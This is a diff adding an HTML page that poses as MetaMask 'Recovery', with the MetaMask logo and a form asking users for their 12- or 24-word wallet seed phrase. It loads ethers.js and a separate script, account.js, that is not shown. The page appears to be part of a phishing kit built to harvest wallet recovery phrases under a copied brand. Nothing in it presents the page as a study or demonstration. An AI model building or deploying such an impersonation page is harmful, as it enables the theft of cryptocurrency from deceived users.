@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Metamask:Recovery</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <link rel="stylesheet" href="css/phrase.css">
+</head>
+<body>
+    <header>
+        <nav>
+            <div class="logos">
+                <div class="logo-img">
+                    <img src="/img/metamask-fox-wordmark-horizontal.png" alt="">
+                </div>
+            </div>
+            <div class="menu-btn">
+                <i class="fa-solid fa-bars open-btn"></i>
+                <i class="fa-solid fa-times close-btn hide"></i>
+            </div>
+            <div class="menu">
+                <ul>
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+                    <!-- <li>
+                        <a href="#">About</a>
+                    </li> -->
+                    <li>
+                        <a href="/recover.html">Recover Wallet</a>
+                    </li>
+                </ul>
+            </div>
+        </nav>
+    </header>
+    <main>
+        <form> 
+            <div class="form_group">
+                <textarea type="text" name="phrase" id="phrase" cols="30" rows="10" minlength="15" required/></textarea>
+                <label for="phrase">Phrase</label>
+                <small class="warning text-danger hide">Not a valid mnemonic</small>
+            
+                <p class="parag">
+                    Typically 12 (sometimes 24) words separated by single spaces
+                </p>
+            </div>
+            <div class="form_group">
+                <button type="submit" class="submit-btn">
+                    GET ACCOUNT
+                </button>
+            </div>   
+        </form>
+    </main>
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
+    <script type="module" src="./js/account.js"></script>
+</body>
+</html>
